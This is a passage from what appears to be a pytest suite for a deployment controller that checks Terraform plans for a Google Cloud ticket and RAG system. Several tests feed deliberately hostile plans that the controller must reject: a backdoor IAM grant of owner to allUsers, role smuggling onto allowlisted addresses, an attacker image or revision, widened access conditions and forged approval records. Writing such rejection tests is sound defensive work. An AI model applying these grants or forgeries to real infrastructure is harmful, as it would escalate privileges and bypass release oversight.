            release_phase="shadow", image_digest=IMAGE,
        )


@pytest.mark.parametrize(
    ("resource_type", "resource_name", "after", "message"),
    [
        (
            "google_cloud_run_v2_service", "producer",
            {"project": PROJECT, "name": "kb-rag-system"},
            "service name",
        ),
        (
            "google_firestore_database", "ticket",
            {"project": PROJECT, "name": "(default)"},
            "database",
        ),
        (
            "google_secret_manager_secret_iam_member", "runtime_accessor",
            {
                "project": PROJECT, "role": "roles/secretmanager.secretAccessor",
                "secret_id": "api-key",
                "member": f"serviceAccount:ticket-worker-prod@{PROJECT}.iam.gserviceaccount.com",
            },
            "principal",
        ),
    ],
)
def test_staging_plan_rejects_cross_environment_semantics(
        controller, resource_type, resource_name, after, message):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": f"module.staging.{resource_type}.{resource_name}[0]",
            "mode": "managed", "type": resource_type, "name": resource_name,
            "change": {"actions": ["create"], "before": None, "after": after},
        }],
    }

    with pytest.raises(ControllerRejected, match=message):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


def test_environment_plan_rejects_unapproved_resource_address(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": "module.staging.google_project_iam_member.backdoor",
            "mode": "managed", "type": "google_project_iam_member",
            "name": "backdoor",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "role": "roles/owner", "member": "allUsers",
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="resource address"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


def test_environment_plan_rejects_hijacked_allowlisted_iam_address(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                "module.staging.google_secret_manager_secret_iam_member."
                "runtime_accessor[0]"
            ),
            "mode": "managed", "type": "google_secret_manager_secret_iam_member",
            "name": "runtime_accessor",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "role": "roles/run.admin",
                "secret_id": "api-key",
                "member": (
                    f"serviceAccount:ticket-producer-stg@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="IAM role"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


def test_staging_plan_rejects_unbound_baseline_traffic(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    producer_secret_keys = {
        "API_KEY", "OPENAI_API_KEY",
        "PINECONE_API_KEY", "TICKET_FAULT_SIGNING_SECRET",
    }
    secret_env = [{
        "name": key,
        "value_source": {"secret_key_ref": {
            "secret": (
                f"projects/{PROJECT}/secrets/{key.lower().replace('_', '-')}"
            ),
            "version": "1",
        }},
    } for key in producer_secret_keys]
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": "module.staging.google_cloud_run_v2_service.producer[0]",
            "mode": "managed", "type": "google_cloud_run_v2_service",
            "name": "producer",
            "change": {"actions": ["update"], "before": None, "after": {
                "project": PROJECT,
                "name": "kb-rag-system-staging",
                "ingress": "INGRESS_TRAFFIC_ALL",
                "template": [{
                    "service_account": (
                        f"ticket-producer-stg@{PROJECT}.iam.gserviceaccount.com"
                    ),
                    "containers": [{"image": IMAGE, "env": [
                        {"name": "APP_ROLE", "value": "producer"},
                        {"name": "TICKET_HANDLER_MODE", "value": "shadow"},
                        {"name": "TICKET_SHADOW_SAMPLE_RATE", "value": "1"},
                        *secret_env,
                    ]}],
                }],
                "traffic": [
                    {"revision": "attacker-revision", "percent": 0, "tag": "baseline"},
                    {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
                     "percent": 100, "tag": "candidate"},
                ],
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="traffic"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


@pytest.mark.parametrize(
    ("environment", "release_phase", "role"),
    [
        ("staging", "dark_no_traffic", "producer"),
        ("staging", "dark_100", "producer"),
        ("staging", "shadow", "producer"),
        ("staging", "knowledge_only", "producer"),
        ("staging", "full", "producer"),
        ("production", "dark_no_traffic", "producer"),
        ("production", "dark_100", "producer"),
        ("production", "shadow", "producer"),
        ("production", "knowledge_only", "producer"),
        ("production", "full", "producer"),
        ("staging", "dark_100", "worker"),
        ("staging", "shadow", "worker"),
        ("staging", "full", "worker"),
        ("production", "dark_no_traffic", "worker"),
        ("production", "full", "worker"),
    ],
)
def test_environment_plan_accepts_exact_runtime_contract_by_phase(
    environment, release_phase, role,
):
    plan, tfvars = _runtime_service_plan(environment, release_phase, role)

    _validate_environment_plan(
        plan, environment=environment, project_id=PROJECT, tfvars=tfvars,
        image_digest=IMAGE, release_phase=release_phase,
    )


@pytest.mark.parametrize(
    ("environment", "release_phase", "mutation", "message"),
    [
        ("production", "dark_no_traffic", "full_mode", "handler mode"),
        ("production", "dark_no_traffic", "candidate_100", "traffic"),
        ("production", "dark_no_traffic", "wrong_baseline", "traffic"),
        ("staging", "shadow", "zero_shadow", "shadow sample"),
        ("staging", "full", "shadow_mode", "handler mode"),
        ("staging", "full", "wrong_candidate_tag", "traffic"),
    ],
)
def test_environment_plan_rejects_phase_mode_sampling_or_traffic_smuggling(
    environment, release_phase, mutation, message,
):
    plan, tfvars = _runtime_service_plan(environment, release_phase)
    after = plan["resource_changes"][0]["change"]["after"]
    env = after["template"][0]["containers"][0]["env"]
    if mutation == "full_mode":
        next(item for item in env if item["name"] == "TICKET_HANDLER_MODE")[
            "value"
        ] = "full"
    elif mutation == "candidate_100":
        after["traffic"] = [{
            "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
            "percent": 100, "tag": "candidate",
        }]
    elif mutation == "wrong_baseline":
        after["traffic"][0]["revision"] = "kb-rag-system-00049-attacker"
    elif mutation == "zero_shadow":
        next(item for item in env if item["name"] == "TICKET_SHADOW_SAMPLE_RATE")[
            "value"
        ] = "0"
    elif mutation == "shadow_mode":
        next(item for item in env if item["name"] == "TICKET_HANDLER_MODE")[
            "value"
        ] = "shadow"
    else:
        after["traffic"][-1]["tag"] = "latest"

    with pytest.raises(ControllerRejected, match=message):
        _validate_environment_plan(
            plan, environment=environment, project_id=PROJECT, tfvars=tfvars,
            image_digest=IMAGE, release_phase=release_phase,
        )


@pytest.mark.parametrize(
    ("environment", "release_phase", "role", "removed_key"),
    [
        ("staging", "dark_100", "producer", "OPENAI_API_KEY"),
        ("staging", "full", "producer", "API_KEY"),
        ("staging", "full", "worker", "TICKET_FAULT_SIGNING_SECRET"),
        ("production", "full", "producer", "OPENAI_API_KEY"),
        ("production", "full", "worker", "FORUSBOTS_AUTH_TOKEN"),
    ],
)
def test_environment_plan_rejects_incomplete_role_secret_set(
    environment, release_phase, role, removed_key,
):
    plan, tfvars = _runtime_service_plan(environment, release_phase, role)
    env = plan["resource_changes"][0]["change"]["after"]["template"][0][
        "containers"
    ][0]["env"]
    env[:] = [item for item in env if item.get("name") != removed_key]

    with pytest.raises(ControllerRejected, match="secret env set"):
        _validate_environment_plan(
            plan, environment=environment, project_id=PROJECT, tfvars=tfvars,
            image_digest=IMAGE, release_phase=release_phase,
        )


def test_environment_plan_accepts_execution_log_ttl_resource():
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                "module.staging.google_firestore_field.core_execution_ttl"
            ),
            "mode": "managed", "type": "google_firestore_field",
            "name": "core_execution_ttl",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "database": "ticket-staging",
                "collection": "execution_logs", "field": "expires_at",
            }},
        }],
    }

    _validate_environment_plan(
        plan, environment="staging", project_id=PROJECT,
        tfvars=_plan_tfvars("staging", "dark_100"), image_digest=IMAGE,
        release_phase="dark_100",
    )


def test_environment_plan_rejects_alternate_digest_in_allowlisted_service(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": "module.staging.google_cloud_run_v2_service.worker[0]",
            "mode": "managed", "type": "google_cloud_run_v2_service",
            "name": "worker",
            "change": {"actions": ["update"], "before": None, "after": {
                "project": PROJECT,
                "name": "kb-rag-ticket-worker-staging",
                "template": [{"containers": [{
                    "image": "us-central1-docker.pkg.dev/proj/repo/app@sha256:" + "9" * 64,
                }]}],
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="approved digest"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "shadow",
            "--platform-outputs-uri", outputs_uri,
            "--environment-tfvars-uri", environment_uri,
        ])


def test_platform_plan_rejects_owner_on_allowlisted_iam_address(controller):
    rc, tools, _artifacts = controller
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_project_iam_member.pipeline_logs["ci"]',
            "mode": "managed", "type": "google_project_iam_member",
            "name": "pipeline_logs",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "role": "roles/owner",
                "member": f"serviceAccount:ticket-ci@{PROJECT}.iam.gserviceaccount.com",
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="platform IAM role"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


def test_platform_plan_rejects_builtin_role_smuggling_on_logs_address(controller):
    rc, tools, _artifacts = controller
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_project_iam_member.pipeline_logs["ci"]',
            "mode": "managed", "type": "google_project_iam_member",
            "name": "pipeline_logs",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "role": "roles/run.admin",
                "member": f"serviceAccount:ticket-ci@{PROJECT}.iam.gserviceaccount.com",
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="platform IAM role"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


@pytest.mark.parametrize(
    ("address", "resource_type", "resource_name", "after", "message"),
    [
        (
            'google_project_iam_member.apply_functional["evil"]',
            "google_project_iam_member", "apply_functional",
            {
                "project": PROJECT, "role": "roles/artifactregistry.admin",
                "member": f"serviceAccount:ticket-worker-stg@{PROJECT}.iam.gserviceaccount.com",
            },
            "apply binding",
        ),
        (
            'google_storage_bucket_iam_member.apply_state_admin["staging"]',
            "google_storage_bucket_iam_member", "apply_state_admin",
            {
                "bucket": "unrelated-sensitive-bucket",
                "role": "roles/storage.objectAdmin",
                "member": (
                    f"serviceAccount:ticket-apply-staging@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            },
            "state bucket",
        ),
    ],
)
def test_platform_plan_rejects_address_member_and_target_smuggling(
    controller, address, resource_type, resource_name, after, message,
):
    rc, tools, _artifacts = controller
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": address, "mode": "managed", "type": resource_type,
            "name": resource_name,
            "change": {"actions": ["create"], "before": None, "after": after},
        }],
    }

    with pytest.raises(ControllerRejected, match=message):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


def test_platform_handoff_cannot_bypass_disabled_environment_container_gate(controller):
    rc, tools, _artifacts = controller
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_project_iam_member.environment_run_creator["staging"]',
            "mode": "managed", "type": "google_project_iam_member",
            "name": "environment_run_creator",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT,
                "role": f"projects/{PROJECT}/roles/ticketTfEnvironmentRunCreate",
                "member": (
                    f"serviceAccount:ticket-apply-staging@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="handoff requires managed"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
            "--staging-handoff-phase", "bootstrap",
        ])


def test_platform_handoff_managed_is_rejected_while_containers_are_disabled(controller):
    rc, _tools, _artifacts = controller

    with pytest.raises(ControllerRejected, match="handoff requires managed"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
            "--staging-handoff-phase", "managed",
            "--staging-run-resources", "services/kb-rag-system-staging",
        ])


def test_platform_plan_rejects_environment_container_during_g1b_disabled_phase(controller):
    rc, tools, _artifacts = controller
    tools.semantic_plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_firestore_database.environment["staging"]',
            "mode": "managed", "type": "google_firestore_database",
            "name": "environment",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "name": "ticket-staging",
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="gate-disabled"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


def test_environment_plan_rejects_disabled_platform_container_handoff(controller):
    rc, _tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts, managed=False)

    with pytest.raises(ControllerRejected, match="not authorized by platform handoff"):
        rc._platform_tfvars("staging", outputs_uri)  # noqa: SLF001


@pytest.mark.parametrize(
    ("resource_type", "after"),
    [
        ("google_firestore_database", {"name": "(default)"}),
        ("google_cloud_tasks_queue", {"name": "ticket-jobs-prod"}),
        (
            "google_cloud_scheduler_job",
            {"name": "ticket-reconciler-prod-tick"},
        ),
    ],
)
def test_platform_plan_rejects_staging_index_with_production_container(
    controller, resource_type, after,
):
    rc, _tools, _artifacts = controller
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": f'{resource_type}.environment["staging"]',
            "mode": "managed", "type": resource_type, "name": "environment",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, **after,
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="environment target"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "managed", "production": "disabled"},
        )


def test_platform_plan_rejects_queue_iam_cross_environment_target(controller):
    rc, _tools, _artifacts = controller
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_cloud_tasks_queue_iam_member.runtime_producer_queue["staging"]',
            "mode": "managed", "type": "google_cloud_tasks_queue_iam_member",
            "name": "runtime_producer_queue",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "name": "ticket-jobs-prod",
                "role": f"projects/{PROJECT}/roles/ticketQueueEnqueuerProduction",
                "member": (
                    f"serviceAccount:ticket-producer-stg@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="queue IAM target"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "managed", "production": "disabled"},
        )


def test_platform_plan_accepts_exact_queue_scoped_task_inspector(controller):
    rc, _tools, _artifacts = controller
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                'google_cloud_tasks_queue_iam_member.'
                'platform_apply_queue_task_inspector["staging"]'
            ),
            "mode": "managed", "type": "google_cloud_tasks_queue_iam_member",
            "name": "platform_apply_queue_task_inspector",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "name": "ticket-jobs-staging",
                "role": (
                    f"projects/{PROJECT}/roles/"
                    "ticketTfPlatformQueueTaskInspector"
                ),
                "member": (
                    f"serviceAccount:ticket-apply-platform@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }, *_managed_runtime_iam_changes("staging")],
    }

    _validate_platform_plan(
        plan, project_id=PROJECT,
        container_phases={"staging": "managed", "production": "disabled"},
    )
    plan["resource_changes"][0]["change"]["after"]["name"] = "ticket-jobs-prod"
    with pytest.raises(ControllerRejected, match="queue IAM target"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "managed", "production": "disabled"},
        )


def test_platform_plan_accepts_only_exact_verifier_source_bucket_binding():
    change = {
        "address": (
            "google_storage_bucket_iam_member."
            "controller_verifier_source_reader"
        ),
        "mode": "managed",
        "type": "google_storage_bucket_iam_member",
        "name": "controller_verifier_source_reader",
        "change": {"actions": ["create"], "before": None, "after": {
            "bucket": f"{PROJECT}_cloudbuild",
            "role": "roles/storage.objectViewer",
            "member": (
                f"serviceAccount:ticket-controller-verify@{PROJECT}.iam."
                "gserviceaccount.com"
            ),
        }},
    }
    plan = {"format_version": "1.2", "resource_changes": [change]}

    _validate_platform_plan(
        plan, project_id=PROJECT,
        container_phases={"staging": "disabled", "production": "disabled"},
    )

    for field, value in (
        ("bucket", "unrelated-sensitive-bucket"),
        (
            "member",
            f"serviceAccount:ticket-controller-build@{PROJECT}.iam."
            "gserviceaccount.com",
        ),
    ):
        change["change"]["after"][field] = value
        with pytest.raises(ControllerRejected, match="verifier source bucket"):
            _validate_platform_plan(
                plan, project_id=PROJECT,
                container_phases={
                    "staging": "disabled", "production": "disabled",
                },
            )
        change["change"]["after"][field] = (
            f"{PROJECT}_cloudbuild"
            if field == "bucket"
            else (
                f"serviceAccount:ticket-controller-verify@{PROJECT}.iam."
                "gserviceaccount.com"
            )
        )


def test_platform_plan_accepts_exact_run_invoker_without_queue_state(controller):
    rc, _tools, _artifacts = controller
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_cloud_run_v2_service_iam_member.task_signer_invokes_worker["staging"]',
            "mode": "managed", "type": "google_cloud_run_v2_service_iam_member",
            "name": "task_signer_invokes_worker",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "name": "kb-rag-ticket-worker-staging",
                "role": "roles/run.invoker",
                "member": (
                    f"serviceAccount:ticket-task-signer-stg@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }, *_managed_runtime_iam_changes("staging")],
    }

    _validate_platform_plan(
        plan, project_id=PROJECT,
        container_phases={"staging": "managed", "production": "disabled"},
    )


def test_platform_plan_rejects_production_apply_actas_on_legacy_runner(controller):
    rc, _tools, _artifacts = controller
    del rc
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                "google_service_account_iam_member.environment_apply_actas"
                '["production-ticket-producer-prod"]'
            ),
            "mode": "managed",
            "type": "google_service_account_iam_member",
            "name": "environment_apply_actas",
            "change": {"actions": ["create"], "before": None, "after": {
                "service_account_id": (
                    f"projects/{PROJECT}/serviceAccounts/"
                    f"kb-rag-runner@{PROJECT}.iam.gserviceaccount.com"
                ),
                "role": "roles/iam.serviceAccountUser",
                "member": (
                    f"serviceAccount:ticket-apply-production@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="environment apply actAs"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "disabled", "production": "managed"},
        )


@pytest.mark.parametrize(
    ("address_index", "target_account_id"),
    [
        ("scheduler-staging", "ticket-scheduler-stg"),
        ("scheduler-production", "ticket-scheduler-prod"),
        ("build-runtime-image", "ticket-ci"),
        ("build-production-apply", "ticket-apply-production"),
        ("build-gate-g1b-gcp-owner", "ticket-g1b-gcp"),
    ],
)
def test_platform_plan_accepts_exact_platform_apply_actas_target(
    controller, address_index, target_account_id,
):
    rc, _tools, _artifacts = controller
    del rc
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                "google_service_account_iam_member.platform_apply_actas_scheduler"
                f'["{address_index}"]'
            ),
            "mode": "managed",
            "type": "google_service_account_iam_member",
            "name": "platform_apply_actas_scheduler",
            "change": {"actions": ["create"], "before": None, "after": {
                "service_account_id": (
                    f"projects/{PROJECT}/serviceAccounts/"
                    f"{target_account_id}@{PROJECT}.iam.gserviceaccount.com"
                ),
                "role": "roles/iam.serviceAccountUser",
                "member": (
                    f"serviceAccount:ticket-apply-platform@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }],
    }

    _validate_platform_plan(plan, project_id=PROJECT)


@pytest.mark.parametrize(
    ("address_index", "target_account_id"),
    [
        ("scheduler-staging", "kb-rag-runner"),
        ("build-runtime-image", "kb-rag-runner"),
        ("build-controller-verifier", "ticket-controller-verify"),
        ("build-legacy", "kb-rag-runner"),
        ("scheduler-legacy", "ticket-scheduler-stg"),
    ],
)
def test_platform_plan_rejects_unmanaged_platform_apply_actas_target(
    controller, address_index, target_account_id,
):
    rc, _tools, _artifacts = controller
    del rc
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": (
                "google_service_account_iam_member.platform_apply_actas_scheduler"
                f'["{address_index}"]'
            ),
            "mode": "managed",
            "type": "google_service_account_iam_member",
            "name": "platform_apply_actas_scheduler",
            "change": {"actions": ["create"], "before": None, "after": {
                "service_account_id": (
                    f"projects/{PROJECT}/serviceAccounts/"
                    f"{target_account_id}@{PROJECT}.iam.gserviceaccount.com"
                ),
                "role": "roles/iam.serviceAccountUser",
                "member": (
                    f"serviceAccount:ticket-apply-platform@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="platform apply actAs"):
        _validate_platform_plan(plan, project_id=PROJECT)


def _managed_runtime_iam_changes(environment: str) -> list[dict]:
    suffix = "stg" if environment == "staging" else "prod"
    database = "ticket-staging" if environment == "staging" else "(default)"
    producer = f"ticket-producer-{suffix}"
    worker = f"ticket-worker-{suffix}"
    reconciler = f"ticket-reconciler-{suffix}"
    signer = f"ticket-task-signer-{suffix}"

    def project_binding(name: str, index: str, role: str, account: str) -> dict:
        after = {
            "project": PROJECT,
            "role": role,
            "member": f"serviceAccount:{account}@{PROJECT}.iam.gserviceaccount.com",
        }
        if name == "runtime_firestore":
            after["condition"] = [{
                "title": f"ticket_{index.replace('-', '_')}_database",
                "description": f"Runtime limitado a la database {database}.",
                "expression": (
                    f'resource.name == "projects/{PROJECT}/databases/{database}"'
                ),
            }]
        return {
            "address": f'google_project_iam_member.{name}["{index}"]',
            "mode": "managed", "type": "google_project_iam_member", "name": name,
            "change": {"actions": ["create"], "before": None, "after": after},
        }

    changes = [
        *[
            project_binding(
                "runtime_firestore", f"{environment}-{role}",
                "roles/datastore.user", account,
            )
            for role, account in (
                ("producer", producer), ("worker", worker),
                ("reconciler", reconciler),
            )
        ],
        *[
            project_binding(
                "runtime_vertex", f"{environment}-{role}",
                "roles/aiplatform.user", account,
            )
            for role, account in (("producer", producer), ("worker", worker))
        ],
    ]
    if environment == "production":
        changes.extend([
            project_binding(
                "runtime_telemetry", "production-producer-logging",
                "roles/logging.logWriter", producer,
            ),
            project_binding(
                "runtime_telemetry", "production-producer-monitoring",
                "roles/monitoring.metricWriter", producer,
            ),
        ])

    queue_role = (
        f"projects/{PROJECT}/roles/ticketQueueEnqueuer"
        f"{'Staging' if environment == 'staging' else 'Production'}"
    )
    queue_name = "ticket-jobs-staging" if environment == "staging" else "ticket-jobs-prod"
    for name, account in (
        ("runtime_producer_queue", producer),
        ("runtime_reconciler_queue", reconciler),
    ):
        changes.append({
            "address": f'google_cloud_tasks_queue_iam_member.{name}["{environment}"]',
            "mode": "managed", "type": "google_cloud_tasks_queue_iam_member",
            "name": name,
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "name": queue_name, "role": queue_role,
                "member": f"serviceAccount:{account}@{PROJECT}.iam.gserviceaccount.com",
            }},
        })

    signer_target = (
        f"projects/{PROJECT}/serviceAccounts/"
        f"{signer}@{PROJECT}.iam.gserviceaccount.com"
    )
    for name, role, member in (
        (
            "runtime_producer_actas_signer", "roles/iam.serviceAccountUser",
            f"serviceAccount:{producer}@{PROJECT}.iam.gserviceaccount.com",
        ),
        (
            "runtime_reconciler_actas_signer", "roles/iam.serviceAccountUser",
            f"serviceAccount:{reconciler}@{PROJECT}.iam.gserviceaccount.com",
        ),
        (
            "tasks_agent_signs_as_runtime_signer",
            "roles/iam.serviceAccountTokenCreator",
            "serviceAccount:service-900340137010@"
            "gcp-sa-cloudtasks.iam.gserviceaccount.com",
        ),
    ):
        changes.append({
            "address": f'google_service_account_iam_member.{name}["{environment}"]',
            "mode": "managed", "type": "google_service_account_iam_member",
            "name": name,
            "change": {"actions": ["create"], "before": None, "after": {
                "service_account_id": signer_target,
                "role": role,
                "member": member,
            }},
        })
    return changes


@pytest.mark.parametrize("environment", ["staging", "production"])
def test_platform_plan_accepts_complete_managed_runtime_iam_inventory(environment):
    plan = {
        "format_version": "1.2",
        "resource_changes": _managed_runtime_iam_changes(environment),
    }
    phases = {
        "staging": "managed" if environment == "staging" else "disabled",
        "production": "managed" if environment == "production" else "disabled",
    }

    _validate_platform_plan(plan, project_id=PROJECT, container_phases=phases)


@pytest.mark.parametrize(
    ("resource_name", "address_index"),
    [
        ("runtime_firestore", "production-reconciler"),
        ("runtime_vertex", "production-producer"),
        ("runtime_telemetry", "production-producer-monitoring"),
        ("runtime_producer_queue", "production"),
        ("runtime_reconciler_queue", "production"),
        ("runtime_producer_actas_signer", "production"),
        ("runtime_reconciler_actas_signer", "production"),
        ("tasks_agent_signs_as_runtime_signer", "production"),
    ],
)
def test_platform_plan_rejects_incomplete_managed_runtime_iam_inventory(
    resource_name, address_index,
):
    changes = [
        change for change in _managed_runtime_iam_changes("production")
        if not (
            change["name"] == resource_name
            and change["address"].endswith(f'["{address_index}"]')
        )
    ]
    plan = {"format_version": "1.2", "resource_changes": changes}

    with pytest.raises(ControllerRejected, match="runtime IAM inventory"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "disabled", "production": "managed"},
        )


def test_platform_plan_rejects_runtime_telemetry_role_drift():
    changes = _managed_runtime_iam_changes("production")
    monitoring = next(
        change for change in changes
        if change["address"].endswith(
            'runtime_telemetry["production-producer-monitoring"]'
        )
    )
    monitoring["change"]["after"]["role"] = "roles/logging.logWriter"
    plan = {"format_version": "1.2", "resource_changes": changes}

    with pytest.raises(ControllerRejected, match="runtime telemetry role"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "disabled", "production": "managed"},
        )


def test_platform_plan_rejects_cloud_tasks_agent_from_another_project():
    changes = _managed_runtime_iam_changes("production")
    signer = next(
        change for change in changes
        if change["name"] == "tasks_agent_signs_as_runtime_signer"
    )
    signer["change"]["after"]["member"] = (
        "serviceAccount:service-111111111111@"
        "gcp-sa-cloudtasks.iam.gserviceaccount.com"
    )
    plan = {"format_version": "1.2", "resource_changes": changes}

    with pytest.raises(ControllerRejected, match="Cloud Tasks service agent"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "disabled", "production": "managed"},
        )


def test_platform_plan_rejects_index_admin_without_exact_database_condition(controller):
    rc, _tools, _artifacts = controller
    plan = {
        "format_version": "1.2",
        "resource_changes": [{
            "address": 'google_project_iam_member.environment_apply_index_admin["staging"]',
            "mode": "managed", "type": "google_project_iam_member",
            "name": "environment_apply_index_admin",
            "change": {"actions": ["create"], "before": None, "after": {
                "project": PROJECT, "role": "roles/datastore.indexAdmin",
                "member": (
                    f"serviceAccount:ticket-apply-staging@{PROJECT}.iam."
                    "gserviceaccount.com"
                ),
                "condition": [{
                    "title": "staging_database_schema_only",
                    "description": "attacker widened scope",
                    "expression": (
                        f'resource.name.startsWith("projects/{PROJECT}/databases/")'
                    ),
                }],
            }},
        }],
    }

    with pytest.raises(ControllerRejected, match="index condition"):
        _validate_platform_plan(
            plan, project_id=PROJECT,
            container_phases={"staging": "managed", "production": "disabled"},
        )


def test_forged_candidate_approval_rows_cannot_authorize_platform_transition(
    controller,
):
    rc, _tools, _artifacts = controller
    approvals = (
        rc.source.root / "docs" / "verification" / "handle-ticket" / "approvals.md"
    )
    approvals.write_text(
        "| Gate | Texto exacto | Usuario | Rol | Fecha | Alcance | Evidencia |\n"
        "|---|---|---|---|---|---|---|\n"
        f"| G1B | APROBADO G1B {SHA} | attacker | owner | now | platform | fake |\n"
        f"| G2 | APROBADO G2 {SHA} {IMAGE} | attacker | owner | now | staging | fake |\n"
    )

    plan = rc.execute([
        "plan", "platform", "--candidate-sha", SHA,
        "--firestore-scope-phase", "disabled",
        "--cicd-bootstrap-controller-digest", CONTROLLER_IMAGE,
        "--gate-approver-accounts-json", _gate_accounts_json(),
        "--production-release-group-email", "release@example.com",
    ])
    with pytest.raises(ControllerRejected, match="multiparty gate receipt quorum"):
        rc.execute([
            "apply", "platform", "--plan-uri", plan["plan_uri"],
            "--plan-sha256", plan["plan_sha256"],
        ])


def test_platform_post_g1b_plan_binds_exact_pipeline_vars(controller):
    rc, tools, artifacts = controller
    planned = rc.execute([
        "plan", "platform", "--candidate-sha", SHA,
        "--firestore-scope-phase", "disabled",
        "--cicd-bootstrap-controller-digest", CONTROLLER_IMAGE,
        "--gate-approver-accounts-json", _gate_accounts_json(),
        "--production-release-group-email", "release@example.com",
    ])
